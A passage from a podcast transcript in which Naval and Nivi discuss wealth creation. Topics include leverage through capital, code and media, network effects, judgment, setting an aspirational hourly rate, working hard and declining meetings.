It\u2019s this invisible thing that can be accumulated and passed across generations and suddenly seems to result in people having gargantuan amounts of money with nobody else around them or necessarily sharing in it. That said, capital is a powerful form of leverage. It can be converted to labor. It can be converted to other things. It\u2019s very surgical, very analytical. If you are a brilliant investor and give $1 billion and you can make a 30% return with it, whereas anybody else can only make a 20% return, you\u2019re going to get all the money and you\u2019re going to get paid very handsomely for it. It scales very, very well. If you get good at managing capital, you can manage more and more capital much more easily than you can manage more and more people. You need specific knowledge and accountability to obtain capital It is a good form of leverage, but the hard part with capital is how do you obtain it? That\u2019s why I talked about specific knowledge and accountability first. If you have specific knowledge in a domain and if you\u2019re accountable and you have a good name in that domain, then people are going to give you capital as a form of leverage that you can use to then go get more capital. Capital also is fairly well understood. I think a lot of the knocks against capitalism come because of the accumulation of capital. Product and Media Are New Leverage Create software and media that work for you while you sleep Product and media are the new leverage Naval: The most interesting and the most important form of leverage is this idea of products that have no marginal cost of replication. This is the new form of leverage. This was only invented in the last few hundred years. It got started with the printing press. It accelerated with broadcast media, and now it\u2019s really blown up with the Internet and with coding. Now, you can multiply your efforts without having to involve other humans and without needing money from other humans. This podcast is a form of leverage. Long ago, I would have had to sit in a lecture hall and lecture each of you personally. I would have maybe reached a few hundred people and that would have been that. Then 40 years ago, 30 years ago, I would have to be lucky to get on TV, which is somebody else\u2019s leverage. They would have distorted the message. They would taken the economics out of it or charged me for it. They would have muddled the message, and I would have been lucky to get that form of leverage. Today, thanks to the Internet, I can buy a cheap microphone, hook it up to a laptop or an iPad, and there you are all listening. Product leverage is where the new fortunes are made This newest form of leverage is where all the new fortunes are made, all the new billionaires. The last generation, fortunes were made by capital. That was the Warren Buffets of the world. But the new generation\u2019s fortunes are all made through code or media. Joe Rogan making 50 to a 100 million bucks a year from his podcast. You\u2019re going to have a PewDiePie. I don\u2019t know how much money he\u2019s rolling in, but he\u2019s bigger than the news. The Fortnite players. Of course Jeff Bezos and Mark Zuckerberg and Larry Page and Sergey Brin and Bill Gates and Steve Jobs. That is all code-based leverage. Combining all three forms of leverage is a magic combination Now, the beauty is when you combine all of these three. That\u2019s where tech startups really excel, where you take just the minimum, but highest output labor that you can get, which are engineers, and designers, product developers. Then you add in capital. You use that for marketing, advertising, scaling. You add in lots of code and media and podcasts and content to get it all out there. That is a magic combination, and that\u2019s why you see technology startups explode out of nowhere, use massive leverage and just make huge outsize returns. Product and media leverage are permissionless Nivi: Do you want to talk a little bit about permissioned versus permissionless? Naval: Probably the most interesting thing to keep in mind about the new forms of leverage is they are permissionless. They don\u2019t require somebody else\u2019s permission for you to use them or succeed. For labor leverage, somebody has to decide to follow you. For capital leverage, somebody has to give you money to invest or to turn into a product. Coding, writing books, recording podcasts, tweeting, YouTubing, these kinds of things, these are permissionless. You don\u2019t need anyone\u2019s permission to do them, and that\u2019s why they are very egalitarian. They\u2019re great equalizers of leverage. As much as people may rail on Facebook and YouTube, they\u2019re not going to stop using it because this permissionless leverage, where everyone can be a broadcaster, is just too good. The same way you can rail upon Apple for having a slightly closed ecosystem in the iPhone, but everyone\u2019s writing apps for it. As long as you can write apps for it, you can get rich or reach users doing that, why not? The robot army is already here\u2014code lets you tell them what to do I think of all the forms of leverage, the best one in modern society \u2026 This is glib. This is a little overused. This is why I tell people learn to code. It\u2019s that we have this idea that in the future there\u2019s going to be these robots and they\u2019re going to be doing everything. That may be true, but I would say that the majority of the robot revolution has already happened. The robots are already here and there are way more robots than there are humans, it\u2019s just that we pack them in data centers for heat and efficiency reasons. We put them in servers. They\u2019re inside the computers. All the circuits, it\u2019s robot minds inside that\u2019s doing all the work. Every great software developer, for example, now has an army of robots working for him at nighttime, while he or she sleeps, after they\u2019ve written the code and it\u2019s just cranking away. The robot army is already here. The robot revolution has already happened. We\u2019re about halfway through it. We\u2019re just adding in much more of the hardware component these days as we get more comfortable with the idea of autonomous vehicles and autonomous airplanes and autonomous ships and maybe autonomous trucks. There\u2019re delivery bots and Boston Dynamics robots and all that. But robots who are doing web searching for you, for example, are already here. The ones who are cleaning up your video and audio and transmitting it around the world are already here. The ones who are answering many customer service queries, things that you would have had to call a human for are already here. An army of robots is already here. It\u2019s very cheaply available. The bottleneck is just figuring out intelligent and interesting things to do to them. Essentially you can order this army of robots around. The commands have to be issued in a computer language, in a language that they understand. These robots aren\u2019t very smart. They have to be told very precisely what to do and how to do it. Coding is such a great superpower because now you can speak the language of the robot armies and you can tell them what to do. Nivi: I think at this point, people are not only commanding the army of robots within servers through code, they\u2019re actually manipulating the movement of trucks, of other people. Just ordering a package on Amazon, you\u2019re manipulating the movement of many people and many robots to get a package delivered to you. People are doing the same things to build businesses now. There\u2019s the army of robots within servers and then there\u2019s also an army of actual robots and people that are being manipulated through software. Product Leverage is Egalitarian The best products tend to be available to everyone Product leverage is a positive-sum game Naval: Labor and capital are much less egalitarian, not just in the inputs, but in their outputs. Let\u2019s say that I need something that humans have to provide like if I want a massage or if I need someone to cook my food. The more of a human element there is in providing that service, the less egalitarian it is. Jeff Bezos probably has much better vacations than most of us because he has lots of humans running around doing whatever he needs to do. If you look at the output of code and media, Jeff Bezos doesn\u2019t get to watch better movies and TV than we do. Jeff Bezos doesn\u2019t get to even have better computing experience. Google doesn\u2019t give him some premium, special Google account where his searches are better. It\u2019s the nature of code and media output that the same product is accessible to everybody. It turns into a positive sum game where if Jeff Bezos is consuming the same product as a thousand other people, that product is going to be better than the version that Jeff would consume on his own. Status goods are limited to a few people Whereas with other products, that\u2019s not true. If you look at something like buying a Rolex, which is no longer about telling time. It\u2019s a signaling good. It\u2019s all about showing off, \u201cI have a Rolex.\u201d That\u2019s a zero-sum game. If everybody in the world is wearing a Rolex, then people don\u2019t want to wear Rolexes anymore because they no longer signal. It\u2019s canceled out the effect. Rich people do have an advantage in consuming that product. They\u2019ll just price it up until only they can have Rolexes. Then poor people can\u2019t have Rolexes and Rolexes resume their signaling value. The best products tend to be targeted at the middle class Something like watching Netflix or using Google or using Facebook or YouTube or even frankly modern day cars. Rich people don\u2019t have better cars. They just have weirder cars. You can\u2019t drive a Lamborghini on the street at any speed that makes sense for a Lamborghini, so it\u2019s actually a worse car in the street. It just turned into a signaling good at that point. Your sweet spot, where you want to be, is somewhere like a Tesla Model 3 or like a Toyota Corolla which is an amazing car. A new Toyota Corolla is a really nice car, but because it\u2019s mainstream, the technology has amortized the cost of production over the largest number of consumers possible. The best products tend to be at the center, at the sweet spot, the middle class, rather than being targeted at the upper class. Creating wealth with product leads to more ethical wealth I think one of the things that we don\u2019t necessarily appreciate in modern societies is as the forms of leverage have gone from being human-based, labor-based and being capital-based to being more product and code and media-based, that most of the goods and services that we consume are becoming much more egalitarian in their consumption. Even food is becoming that way. Food is becoming cheap and abundant, at least in the first world, too much so to our detriment. Jeff Bezos isn\u2019t necessarily eating better food. He\u2019s just eating different food or he\u2019s eating food that\u2019s prepared and served theatrically, so it\u2019s almost like more of again the human element of performance. But the labor element out of food production has gone down massively. The capital element has gone down massively. Even food production itself has become more technology-oriented, and so the gap between the haves and the have-nots is getting smaller. If you care about ethics in wealth creation, it is better to create your wealth using code and media as leverage because then those products are equally available to everybody as opposed to trying to create your wealth through labor or capital. You want to use the product that is used by the most people What I\u2019m referring to here is scale economies. Technology products and media products have such amazing scale economies that you always want to use the product that is used by the most people. The one that\u2019s used by the most people ends up having the largest budget. There\u2019s no marginal cost of adding another user, and so with the largest budget, you get the highest quality. The best TV shows are actually not going to be some obscure ones just made for a few rich people. They\u2019re going to be the big budget ones, like the Game of Thrones or the Breaking Bad or Bird Box, where they have massive, massive budgets. They can just use those budgets to get to a certain quality level. Then rich people, to be different, they have to fly to Sundance and watch a documentary. You and I aren\u2019t going to fly to Sundance because that\u2019s something that bored rich people do to show off. We\u2019re not going to watch a documentary because most of them just aren\u2019t actually even that good. Again, if you\u2019re wealthy today, for large classes of things, you spend your money on signaling goods to show other people that you\u2019re wealthy, then you try and convert them to status. As opposed to actually consuming the goods for their own sake. Nivi: People and capital as a form of leverage have a negative externality and code and product have a positive externality attached to them, if I was going to sum up your point. Capital and labor are becoming permissionless I think that capital and labor are also starting to become a little more permissionless or at least the permissioning is diffuse because of the Internet. Instead of labor, we have community now, which is a diffused form of labor. For example, Mark Zuckerberg has a billion people doing work for him by using Facebook. Instead of going to raise capital from someone who\u2019s rich, now we have crowdfunding. You can raise millions and millions of dollars for a charity, for a health problem or for a business. You can do it all online. Capital and labor are also becoming permissionless, and you don\u2019t need to necessarily do it the old fashioned way, where you have to go around and ask people for permission to use their money or their time. Pick a Business Model with Leverage An ideal business model has network effects, low marginal costs and scale economies Scale economies: the more you produce, the cheaper it gets Nivi: One more question about leverage. Do you think a choice of business model or a choice of product can also bring a kind of leverage to it? For example, pursuing a business that has network effects. Pursuing a business that has brand effects. Or other choices of business model that people could manipulate that just give you free leverage. Naval: Yeah, there\u2019s some really good microeconomic concepts that are important to understand. One of those is scale economies, which is the more you produce of something the cheaper it gets to make it. That\u2019s something that a lot of businesses have, Basic Economics 101. You should try and get into a business where making Widget Number 12 is cheaper than making Widget Number 5, and making Widget Number 10,000 is a lot cheaper than the previous ones. This builds up an automatic barrier to entry against competition and getting commoditized. That\u2019s an important one. Zero marginal cost of reproduction: producing more is free Another one is, and this is along the same lines, but technology products especially, and media products, have this great quality where they have zero marginal cost of reproduction. Creating another copy of what you just created is free. When somebody listens to this podcast or watches a YouTube video about this, it doesn\u2019t cost me anything for the next person who shows up. Those zero marginal cost things, they take a while to get going because you make very little money per user, but over time they can really, really add up. Joe Rogan is working no harder on his current podcast than he was on Podcast number 1, but on Podcast number 1,100 he\u2019s making a million dollars from the podcast whereas for the previous one he probably lost money; for the first one. That\u2019s an example of zero marginal cost. Network effects: value grows as the square of the customers Then, the most subtle but the most important is this idea of network effects. It comes from computer networking. Bob Metcalfe, who created Ethernet, famously coined Metcalfe\u2019s Law, which is the value of a network is proportional to the square of the number of nodes in the network. If a network of size 10 would have a value of a 100, a network of a size 100 would have a value of 10,000. It\u2019s not just 10 times more, it\u2019s 100 times more, because of the square; the difference is the square. You want to be in a network effects business, assuming you\u2019re not number two. If you\u2019re number one in network effect business, you win everything. Example: if you look at Facebook, your friends and family social networking protocol. Who\u2019s their competitor? Nobody, because they won everything through network effects. Which is why when people say, \u201cWell, I can just switch away from Facebook,\u201d they don\u2019t realize that network effects create natural monopolies. They\u2019re very, very powerful things. Network effect businesses are natural monopolies One of the dirty secrets of Silicon Valley is that a lot of the winning businesses are natural monopolies. Even ride-sharing tends towards one winner-take-all system. Uber will always have better economics than Lyft, as long as it\u2019s moving more drivers and more riders around. Something like Google, there\u2019s basically only one viable search engine. I do like DuckDuckGo, privacy reasons, but they\u2019re just always gonna be behind because of network effects. Twitter: where else would you go for microblogging? Even YouTube has weak network effects, but they\u2019re still powerful enough that there\u2019s really no number two site that you go to, to consume your video on a regular basis. It even turns out in e-tail, Amazon Prime and kind of the convenience of stored credit cards and information creates a powerful network effect. In a network effect, each new user adds value to the existing users What is a network effect? Let\u2019s just define it precisely. A network effect is when each additional user adds value to the existing user base. Your users themselves are creating some value for the existing users. The classic example that I think everybody can understand is, language. Let\u2019s say that there\u2019s 100 people living in the community and speak 10 different languages, and each person just speaks one of those 10. Well, you\u2019re having to translate all the time; it\u2019s incredibly painful. But if all 100 of you spoke the same language, it would add tremendous value. The way that community will play out is, 10 people start off speaking 10 languages, and let\u2019s say one extra person learns English. Well, now all of a sudden, 11 people know English, so the next person comes in to learn a new language is probably going to chose English. At some point, let\u2019s say English gets to 20 or 25 people, it\u2019s done. It\u2019s just going to own the entire language marketplace, and the rest of the languages will get competed out. Which is why, long-term, the entire world is probably going to end up speaking English and Chinese. China\u2019s closed off on the Internet, but the Internet itself is a great leveler, and people who want to communicate on the Internet are forced to speak English because the largest community of people on the Internet speaks English. I always feel bad for my colleagues who grew up speaking foreign languages in foreign countries, because you don\u2019t have access to so many books; so many books just haven\u2019t been translated into other languages. If you only spoke French, or you only spoke German, or you only spoke Hindi, for example, you would be at a severe disadvantage in a technical education. Invariably, if you go and get a technical education, you have to learn English just because you have to read these books that have this data that has not been translated. Languages are probably the oldest example of network effect. Money is another example. We should all probably be using the same money, except for the fact that geographic and regulatory boundaries have created these artificial islands of money. But even then, the world tends to use a single currency as the reserve currency at most times; currently, the US dollar. Zero marginal cost businesses can pivot into network effect businesses Network effects are a very powerful concept, and when you\u2019re picking a business model, it\u2019s a really good idea to pick a model where you can benefit from network effects, low marginal costs, and scale economies; and these tend to go together. Anything that has zero marginal costs of production obviously has scale economies, and things that have zero marginal costs of reproduction very often tend to have network effects, because it doesn\u2019t cost you anything more to stamp out the thing. So then you can just create little hooks for users to add value to each other. You should always be thinking about how your users, your customers, can add value to each other because that is the ultimate form of leverage. You\u2019re at the beach in the Bahamas or you\u2019re sleeping at night and your customers are adding value to each other. Example: From Laborer to Entrepreneur From low to high specific knowledge, accountability and leverage Laborers get paid hourly and have low accountability Naval: The tweetstorm is very abstract. It\u2019s deliberately meant to be broadly applicable to all kinds of different domains and disciplines and time periods and places. But sometimes it\u2019s hard to work without a concrete example. So let\u2019s go concrete for a minute. Look at the real estate business. You could start at the bottom, let\u2019s say you\u2019re a day laborer. You come in, you fix people\u2019s houses. Someone orders you around, tells you, \u201cBreak that piece of rock. Sand that piece of wood. Put that thing over there.\u201d There\u2019s just all these menial jobs that go on, on a construction site. If you\u2019re working one of those jobs, unless you\u2019re a skilled trade, say, a carpenter or electrician, you don\u2019t really have specific knowledge. Even a carpenter or an electrician is not that specific because other people can be trained how to do it. You can be replaced. You get paid your $15, $20, $25, $50, if you\u2019re really lucky, $75 an hour, but that\u2019s about it. You don\u2019t have any leverage other than from the tools that you\u2019re using. If you\u2019re driving a bulldozer that\u2019s better than doing it with your hands. A day laborer in India makes a lot less because they have no tool leverage. You don\u2019t have much accountability. You\u2019re a faceless cog in a construction crew and the owner of the house or the buyer of the house doesn\u2019t know or care that you worked on it. General contractors get equity, but they\u2019re also taking risk One step up from that, you might have a contractor, like a general contractor who someone hires to come and fix and repair and build up their house. That general contractor is taking accountability; they\u2019re taking responsibility. Now let\u2019s say they got paid $250,000 for the job. Sorry, I\u2019m using Bay Area prices, so maybe I\u2019ll go rest of the world prices, $100,000 for the job to fix up a house, and it actually costs the general contractor, all said and done, $70,000. That contractor\u2019s going to pocket that remaining $30,000. They got the upside. They got the equity but they\u2019re also taking accountability and risk. If the project runs over and there\u2019s losses, then they eat the losses. But you see, just the accountability gives them some form of additional potential income. Then, they also have labor leverage because they have a bunch of people working for them. But it probably tops out right there. Property developers pocket the profit by applying capital leverage You can go one level above that and you can look at a property developer. This might be someone who is a contractor who did a bunch of houses, did a really good job, then decided to go into business for themselves and they go around looking for beaten down properties that have potential. They buy them, they either raise money from investors or front it themselves, they fix the place up, and then they sell it for twice what they bought it for. Maybe they only put in 20% more, so it\u2019s a healthy profit. So now a developer like that takes on more accountability, has more risk. They have more specific knowledge because now you have to know: which neighborhoods are worth buying in. Which lots are actually good or which lots are bad. What makes or breaks a specific property. You have to imagine the finished house that\u2019s going to be there, even when the property itself might look really bad right now. There\u2019s more specific knowledge, there\u2019s more accountability and risk, and now you also have capital leverage because you\u2019re also putting in money into the project. But conceivably, you could buy a piece of land or a broken-down house for $200,000 and turn it into a million dollar mansion and pocket all the difference. Architects, large developers and REITs are even higher in the stack One level beyond that might be a famous architect or a developer, where just having your name on a property, because you\u2019ve done so many great properties, increases its value. One level up from that, you might be a person who decides, well, I understand real estate, and I now know enough of the dynamics of real estate that rather than just build and flip my own properties or improve my own properties, I\u2019m gonna be a massive developer. I\u2019m going to build entire communities. Now another person might say, \u201cI like that leverage, but I don\u2019t want to manage all these people. I want to do it more through capital. So I\u2019m gonna start a real estate investment trust.\u201d That requires specific knowledge not just about investing in real estate and building real estate, but it also requires specific knowledge about the financial markets, and the capital markets, and how real estate trusts operate. Real estate tech companies apply the maximum leverage One level beyond that might be somebody who says, \u201cActually, I want to bring the maximum leverage to bear in this market, and the maximum specific knowledge.\u201d That person would say, \u201cWell, I understand real estate, and I understand everything from basic housing construction, to building properties and selling them, to how real estate markets move and thrive, and I also understand the technology business. I understand how to recruit developers, how to write code and how to build good product, and I understand how to raise money from venture capitalists and how to return it and how all of that works.\u201d Obviously not a single person may know this. You may pull a team together to do it where each have different skill sets, but that combined entity would have specific knowledge in technology and in real estate. It would have massive accountability because that company\u2019s name would be a very high risk, high reward effort attached to the whole thing, and people would devote their lives to it and take on significant risk. It would have leverage in code with lots of developers. It would have capital with investors putting money in and the founder\u2019s own capital. It would have labor of some of the highest quality labor that you can find, which is high quality engineers and designers and marketers who are working on the company. Then you may end up with a Trulia or a RedFin or a Zillow kind of company, and then the upside could potentially be in the billions of dollars, or the hundreds of millions of dollars. As you layer in more and more kinds of knowledge that can only be gained on the job and aren\u2019t common knowledge, and you layer in more and more accountability and risk-taking, and you layer in more and more great people working on it and more and more capital on it, and more and more code and media on it, you keep expanding the scope of the opportunity all the way from the day-laborer, who might just literally be scrappling on the ground with their hands, all the way up to somebody who started a real estate tech company and then took it public. Judgment Is the Decisive Skill In an age of nearly infinite leverage, judgment is the most important skill In an age of infinite leverage, judgment becomes the most important skill Nivi: We spoke about specific knowledge, we talked about accountability, we talked about leverage. The last skill that Naval talks about in his tweetstorm is judgment, where he says, that \u201cLeverage is a force multiplier for your judgment.\u201d Naval: We are now living in an age of nearly infinite leverage, and all the great fortunes are created through leverage. Your first job is to go and obtain leverage, and you can obtain leverage through permission by getting people to work for you, or by raising capital. Or you can get leverage permissionlessly by learning how to code or becoming good communicator and podcasting, broadcasting, creating videos, writing, etc. That\u2019s how you get leverage, but once you have leverage, what do you do with it? Well, the first part of your career\u2019s spent hustling to get leverage. Once you have the leverage, then you wanna slow down a bit, because your judgment really matters. It\u2019s like you\u2019ve gone from steering your sailboat around to now you\u2019re steering an ocean liner or a tanker. You have a lot more at risk, but you have a lot more to gain as well. You\u2019re carrying a much higher payload. In an age of infinite leverage, judgment becomes the most important skill. Warren Buffett is so wealthy now because of his judgment. Even if you were to take away all of Warren\u2019s money, tomorrow, investors would come out of the woodwork and hand him a $100 billion because they know his judgment is so good, and they would give him a big chunk of that $100 billion to invest. Everything else you do is setting you up to apply judgment Ultimately, everything else that you do is actually setting you up to apply your judgment. One of the big things that people rail on is CEO pay. For sure there\u2019s crony capitalism that goes on where these CEOs control their boards and the boards give them too much money. But, there are certain CEOs who definitely earned their keep because their judgment is better. If you\u2019re steering a big ship, if you\u2019re steering Google or Apple, and your judgment is 10 or 20 percent better than the next person\u2019s, society will literally pay you hundreds of millions of dollars more, because you\u2019re steering a $100 billion ship. If you\u2019re on course 10 or 20 percent of the time more often than the other person, the compounding results on that hundreds of billions of dollars you\u2019re managing will be so large that your CEO pay will be dwarfed in comparison. Demonstrated judgment, credibility around the judgment, is so critical. Warren Buffett wins here because he has massive credibility. He\u2019s been highly accountable. He\u2019s been right over and over in the public domain. He\u2019s built a reputation for very high integrity, so you can trust him. A person like that, people will throw infinite leverage behind him because of his judgment. Nobody asks him how hard he works; nobody asks him when he wakes up or when he goes to sleep. They\u2019re like, \u201cWarren, just do your thing.\u201d Judgment, especially demonstrated judgment, with high accountability, clear track record, is critical. Judgment is knowing the long-term consequences of your actions Nivi: Let\u2019s define judgment. I would define it as knowing the long-term effects of your decisions, or being able to predict the long-term effects of your decisions. Naval: It\u2019s funny. My definition of wisdom is knowing the long term consequences of your actions, so they\u2019re not all that different. Wisdom is just judgment on a personal domain. Wisdom applied to external problems I think is judgment. They\u2019re highly linked. But, yes, it\u2019s knowing the long term consequences of your actions and then making the right decision to capitalize on that. Without experience, judgment is often less than useless Judgment is very hard to build up. This is where both intellect and experience come in play. There are many problems with the so-called intellectuals in the ivory tower, but one of the reasons why Nassim Taleb rails against them is because they have no skin in the game. They have no real-world experience, so they just apply purely intellect. Intellect without any experience is often worse than useless because you get the confidence that the intellect gives you, and you get some of the credibility, but because you had no skin in the game, and you had no real experience, and no real accountability, you\u2019re just throwing darts. The real world is always far, far more complex than we can intellectualize. Especially all the interesting, fast-moving edge domains and problems, you can\u2019t get there without experience. If you are smart and you iterate fast, it\u2019s not even you put 10,000 hours into something, but you take 10,000 tries at something. The people with the best judgment are among the least emotional If you are smart and you have a lot of quick iterations, and you try to keep your emotions out of it, the people with the best judgment are actually among the least emotional. A lot of the best investors are considered almost robotic in that regard, but I wouldn\u2019t be surprised if even the best entrepreneurs often come across as unemotional. There is sort of this archetype of the passionate entrepreneur, and yeah, they have to care about what they\u2019re doing, but they also have to see very clearly what\u2019s actually happening. The thing that prevents you from seeing what\u2019s actually happening are your emotions. Our emotions are constantly clouding our judgment, and in investing, or in running companies, or in building products, or being an entrepreneur, emotions really get in the way. Emotions are what prevent you from seeing what\u2019s actually happening, until you can no longer resist the truth of what\u2019s happening, until it becomes too sudden, and then you\u2019re forced into suffering; which is sort of a breaking of this fantasy that you had put together. Nivi: To try and connect some of these concepts, I would say that, first, you\u2019re accountable for your judgment. Judgment is the exercise of wisdom. Wisdom comes from experience; and that experience can be accelerated through short iterations. Top investors often sound like philosophers Naval: And the reason why a lot of the top investors, a lot of the value investors, like if you read Jeremy Grantham, or you read Warren Buffet, or you read up on Michael Burry, these people sound like philosophers, or they are philosophers, or they\u2019re reading a lot of history books or science books. Like what are they doing, shouldn\u2019t they be reading investment books. No. Investment books are the worst place to learn about investment, because investment is a real-world activity that is highly multi-variate, all the advantages are always being competed away. It\u2019s always on the cutting-edge. What you actually just need is very, very broad-based judgment and thinking. The best way to do that is to study everything, including a lot of philosophy. Philosophy also makes you more stoic, makes you less emotional, and so you make better decisions; you have better judgment. The more outraged someone is, the worse their judgment One simple thing is I see \u2026 I go out on Twitter and it seems like half of Twitter is outraged at something at all times. You can go within someone\u2019s Twitter feed and get at least some semblance of what it must be like to be in their head all the time. The more outraged somebody is, I guarantee you, the worse their judgment is. If someone\u2019s constantly tweeting political outrage, and just see like an angry person getting into fights, you don\u2019t want to hand this person the keys to your car, let alone the keys to your company. Set an Aspirational Hourly Rate Outsource tasks that cost less than your hourly rate Set and enforce an aspirational hourly rate Nivi: We covered the skills you need to get rich. They included specific knowledge, accountability, leverage, judgment and life-long learning. Let\u2019s talk about the importance of working hard and valuing your time. Naval: No one is going to value you more than you value you. Set a high personal hourly rate, and stick to it. When I was young, I decided I was worth a lot more than the market thought I was worth. And I started treating myself that way. Factor your time into every decision. Say you value your time at $100 an hour. If you decide to spend an hour driving across town to get something, you\u2019re effectively throwing away $100. Are you going to do that? Say you buy something from Amazon and they screw it up. Is it worth your time to return it? Is it worth the mental hassle? Keep in mind that you will have less time for work, including mentally high-output work. Do you want to use that time running errands and solving little problems? Or do you want to save it for the big stuff? The great scientists were terrible at managing their home lives. None of them had an organized room, or made social events on time, or sent their thank-you cards. You can\u2019t penny pinch your way to wealth You can spend your life however you want. But if you want to get rich, it has to be your top priority. It has to come before anything else, which means you can\u2019t penny-pinch. This is what people don\u2019t understand. You can penny-pinch your way to basic sustenance. You can keep expenses low and maybe retire early. That\u2019s perfectly valid. But we\u2019re here to talk about wealth creation. If you\u2019re going to create wealth, it has to be your number-one, overwhelming priority. My aspirational rate was $5,000/hr Fast-forward to your wealthy self and pick an intermediate hourly rate. Before I had any real money and you could hire me, I set an aspirational rate of $5,000 an hour. Of course, I still ended up doing stupid things like arguing with the electrician or returning the broken speaker. But I shouldn\u2019t have. And I did a lot less of it my friends. I would make a theatrical show out of throwing something in the trash or giving it to Salvation Army, rather than returning it or trying to fix it. I would argue with girlfriends, \u201cI don\u2019t do that. That\u2019s not a problem that I solve.\u201d I still argue that today with my wife and with my mother, when she hands me little to-do\u2019s. I say, \u201cI would rather hire you an assistant.\u201d This was true even when I didn\u2019t have money. If you can outsource something for less than your hourly rate, do it Another way to think about this: If you can outsource something\u2014or not do something\u2014for less than your hourly rate, outsource it or don\u2019t do it. If you can hire someone to do it for less than your hourly rate, hire them. That includes things like cooking. You may want to make your own healthy, home-cooked meals. But if you can outsource it, do that instead. People say, \u201cWhat about the joy of life? What about getting it right, just your way?\u201d Sure, you can do that. But you\u2019re not going to be wealthy, because you\u2019ve made something else a priority. Paul Graham said it well for Y Combinator startups. He said you should be working on your product and getting product-market fit, and you should be exercising and eating healthy. That\u2019s about it. That\u2019s all you have time for while you\u2019re on this mission. Your hourly rate should seem absurdly high Set a very high aspirational hourly rate for yourself, and stick to it. It should seem and feel absurdly high. If it doesn\u2019t, it\u2019s not high enough. Whatever you pick, my advice is to raise it. For the longest time, I used $5,000 an hour. If you extrapolate that out as an annual salary, it\u2019s multiple millions of dollars per year. I actually think I\u2019ve beaten it, which is interesting given that I\u2019m not the hardest worker. I work through bursts of energy when I\u2019m motivated to work on something. Work As Hard As You Can Even though what you work on and who you work with are more important Work as hard as you can Naval: Let\u2019s talk about hard work. There\u2019s a battle that happens on Twitter a lot. Should you work hard or should you not? David Heinemeier Hansson says, \u201cIt\u2019s like you\u2019re slave-driving people.\u201d Keith Rabois says, \u201cNo, all the great founders worked their fingers to the bone.\u201d They\u2019re talking past each other. First of all, they\u2019re talking about two different things. David is talking about employees and a lifestyle business. If you\u2019re doing that, your number one priority is not getting wealthy. You have a job, a family and also your life. Keith is talking about the Olympics of startups. He\u2019s talking about the person going for the gold medal and trying to build a multi-billion dollar public company. That person has to get everything right. They have to have great judgment. They have to pick the right thing to work on. They have to recruit the right team. They have to work crazy hard. They\u2019re engaged in a competitive sprint. If getting wealthy is your goal, you\u2019re going to have to work as hard as you can. But hard work is no substitute for who you work with and what you work on. Those are the most important things. What you work on and who you work with are more important Marc Andreessen came up with the concept of the \u201c product-market fit .\u201d I would expand that to \u201cproduct-market-founder fit,\u201d taking into account how well a founder is personally suited to the business. The combination of the three should be your overwhelming goal. You can save a lot of time by picking the right area to work in. Picking the right people to work with is the next most important piece. Third comes how hard you work. They are like three legs of a stool. If you shortchange any one of them, the whole stool is going to fall. You can\u2019t easily pick one over the other. When you\u2019re building a business, or a career, first figure out: \u201cWhat should I be doing? Where is a market emerging? What\u2019s a product I can build that I\u2019m excited to work on, where I have specific knowledge?\u201d No matter how high your bar is, raise it Second, surround yourself with the best people possible. If there\u2019s someone greater out there to work with, go work with them. When people ask for advice about choosing the right startup to join, I say, \u201cPick the one that\u2019s going to have the best alumni network for you in the future.\u201d Look at the PayPal mafia\u2014they worked with a bunch of geniuses, so they all got rich. Pick the people with the highest intelligence, energy and integrity that you can find. And no matter how high your bar is, raise it. Finally, once you\u2019ve picked the right thing to work on and the right people, work as hard as you can. Nobody really works 80 hours a week This is where the mythology gets a little crazy. People who say they work 80-hour weeks, or even 120-hour weeks, often are just status signaling. It\u2019s showing off. Nobody really works 80 to 120 hours a week at high output, with mental clarity. Your brain breaks down. You won\u2019t have good ideas. The way people tend to work most effectively, especially in knowledge work, is to sprint as hard as they can while they feel inspired to work, and then rest. They take long breaks. It\u2019s more like a lion hunting and less like a marathoner running. You sprint and then you rest. You reassess and then you try again. You end up building a marathon of sprints. Inspiration is perishable Inspiration is perishable. When you have inspiration, act on it right then and there. If I\u2019m inspired to write a blog post or publish a tweetstorm, I should do it right away. Otherwise, it\u2019s not going to get out there. I won\u2019t come back to it. Inspiration is a beautiful and powerful thing. When you have it, seize it. Impatience with actions, patience with results People talk about impatience. When do you know to be impatient? When do you know to be patient? My glib tweet on this was: \u201c Impatience with actions, patience with results. \u201d I think that\u2019s a good philosophy for life. Anything you have to do, get it done. Why wait? You\u2019re not getting any younger. You don\u2019t want to spend your life waiting in line. You don\u2019t want to spend it traveling back and forth. You don\u2019t want to spend it doing things that aren\u2019t part of your mission. When you do these things, do them as quickly as you can and with your full attention so you do them well. Then be patient with the results because you\u2019re dealing with complex systems and a lot of people. It takes a long time for markets to adopt products. It takes time for people to get comfortable working with each other. It takes time for great products to emerge as you polish away. Impatience with actions, patience with results. If I discover a problem in one of my businesses, I won\u2019t sleep until the resolution is at least in motion. If I\u2019m on the board of a company, I\u2019ll call the CEO. If I\u2019m running the company, I\u2019ll call my reports. If I\u2019m responsible, I\u2019ll get on it, right then and there, and solve it. If I don\u2019t solve a problem the moment it happens\u2014or if I don\u2019t move towards solving it\u2014I have no peace. I have no rest. I have no happiness until the problem is solved. So I solve it as quickly as possible. I literally won\u2019t sleep until it\u2019s solved\u2014maybe that\u2019s just a personal characteristic. But it\u2019s worked out well in business. Be Too Busy to \u2018Do Coffee\u2019 Ruthlessly decline meetings Be too busy to \u2018do coffee\u2019 while keeping an uncluttered calendar Naval: Another tweet was: \u201c You should be too busy to \u2018do coffee,\u2019 while still keeping an uncluttered calendar. \u201d People who know me know I\u2019m famous for simultaneously doing two things. First, I keep a very clean calendar. I have almost no meetings on it. When some people see my calendar, they almost weep. Second, I\u2019m busy all the time. I\u2019m always doing something. It\u2019s usually work-related. It\u2019s whatever high-impact thing that needs to be done, that I\u2019m most inspired to do. The only way to do that is to constantly, and ruthlessly, decline meetings. People want to \u201cdo coffee\u201d and build relationships. That\u2019s fine early in your career, when you\u2019re still exploring. But later in your career\u2014when you\u2019re exploiting, and there are more things coming at you than you have time for\u2014you have to ruthlessly cut meetings out of your life. Ruthlessly cut meetings If someone wants a meeting, see if they will do a call instead. If they want to call, see if they will email instead. If they want to email, see if they will text instead. And you probably should ignore most text messages\u2014unless they\u2019re true emergencies. You have to be utterly ruthless about dodging meetings. When you do meetings, make them walking meetings. Do standing meetings. Keep them short, actionable and small. Nothing is getting done in a meeting with eight people around a conference table. You are literally dying one hour at a time. Nivi: \u201cDoing coffee\u201d reminds me of an old quote, I think from Steve Jobs, when someone asked him why Apple didn\u2019t come to a convention. His response was something like, \u201cBecause we wouldn\u2019t be here working.\u201d Naval: I used to have a tough time turning people down for meetings. Now I just tell them outright, \u201cI don\u2019t do 